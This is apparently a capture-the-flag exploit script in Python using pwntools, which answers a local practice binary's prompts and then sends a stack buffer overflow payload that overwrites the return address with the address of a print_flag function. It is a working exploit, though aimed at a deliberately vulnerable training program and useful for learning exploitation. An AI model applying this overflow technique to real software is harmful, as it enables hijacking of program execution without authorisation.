

import struct
from pwn import *
import re

# Our target
target = './baby-exploit'

arg1 = ''
proc_args = [target, arg1]

context.log_level = 'debug'
e = context.binary = ELF(target,checksec=False)

context.terminal = ['tmux','splitw','-h']

print_flag = e.symbols['print_flag']
main = e.symbols['main']

p=process(target)

gdb.attach(p,
           f'''
           b *main+459
           ''',
           )


io=p

# Jump over annoying 'yes' questions
print(io.recv())
io.sendline('yes')
print(io.recv())
io.sendline('yes')
line =  io.recv()

# Output processing 
m = re.search('\? ([0-9]{1,2})\? or ([0-9]{1,2})\?',line.decode())
num1 = int(m.group(1))
num2 = int(m.group(2))

num = num1 if num1 > num2 else num2

io.sendline(str(num))
print(io.recv())



print(hex(print_flag))
print("Sending the Payload NOW")

# buf: 0xffffd3f0
# ebp: 0xffffd408:

# payload = ''
payload = cyclic(0x20)
payload += cyclic(8)
payload += p64(print_flag)
# payload += cyclic(64)
io.sendline(payload)

io.interactive()
exit()





# Send a command to Bash
io.sendline("echo hello")

# Interact with the process
io.interactive()


print(io.recv())

